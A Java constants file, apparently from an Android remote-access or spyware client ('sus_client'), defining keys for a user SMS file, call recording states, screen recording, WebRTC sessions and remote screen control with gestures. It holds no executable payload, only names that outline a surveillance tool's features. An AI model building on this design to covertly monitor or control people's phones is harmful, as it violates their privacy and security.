package com.android.sus_client.utils;

public interface Constants {

    String USER_SMS_FILENAME = "UserSms.txt";

    /**
     * Calls recordings
     */
    String COMMAND_TYPE_CALL = "commandTypeCall";
    String PHONE_NUMBER = "phoneNumber";
    String TYPE_CALL = "callType";
    int TYPE_CALL_OUTGOING = 1;
    int TYPE_CALL_INCOMING = 2;

    int STATE_INCOMING_NUMBER = 1;
    int STATE_CALL_START = 2;
    int STATE_CALL_END = 3;

    /**
     * Screen recordings
     */
    String MAX_FILE_SIZE_KEY = "maxFileSize";
    String ERROR_REASON_KEY = "errorReason";
    String ERROR_KEY = "error";
    String ON_COMPLETE_KEY = "onComplete";
    String ON_START_KEY = "onStart";
    String ON_COMPLETE = "Uri was passed";
    String ON_PAUSE_KEY = "onPause";
    String ON_RESUME_KEY = "onResume";
    String ON_PAUSE = "Paused";
    String ON_RESUME = "Resumed";
    int SETTINGS_ERROR = 38;
    int MAX_FILE_SIZE_REACHED_ERROR = 48;
    int GENERAL_ERROR = 100;
    int ON_START = 111;
    int NO_SPECIFIED_MAX_SIZE = 0;

    /**
     * For Peer to Peer connection
     */
    String EXTRA_EVENT = "event";
    String EXTRA_SESSION = "session";
    String EXTRA_WEBRTCUP = "webrtcup";
    String EXTRA_MESSAGE = "message";

    /**
     * For Remote control display
     */
    String ACTION_SCREEN_SHARING_START = "SCREEN_SHARING_START";
    String ACTION_SCREEN_SHARING_STOP = "SCREEN_SHARING_STOP";
    String ACTION_SCREEN_SHARING_PERMISSION_NEEDED = "SCREEN_SHARING_PERMISSION_NEEDED";
    String ACTION_SCREEN_SHARING_FAILED = "SCREEN_SHARING_FAILED";
    String ACTION_CONNECTION_FAILURE = "CONNECTION_FAILURE";
    String ACTION_GESTURE = "GESTURE";

}